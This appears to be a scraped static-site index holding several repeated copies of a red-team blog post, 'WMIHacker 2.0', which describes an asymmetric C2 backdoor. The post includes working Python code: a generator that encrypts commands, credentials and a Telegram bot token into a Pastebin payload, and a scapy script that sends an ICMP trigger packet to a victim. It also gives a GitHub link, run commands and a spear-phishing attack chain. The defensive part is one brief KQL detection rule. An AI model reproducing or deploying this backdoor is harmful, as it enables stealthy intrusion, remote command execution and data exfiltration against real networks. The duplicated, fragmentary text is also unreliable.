actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. 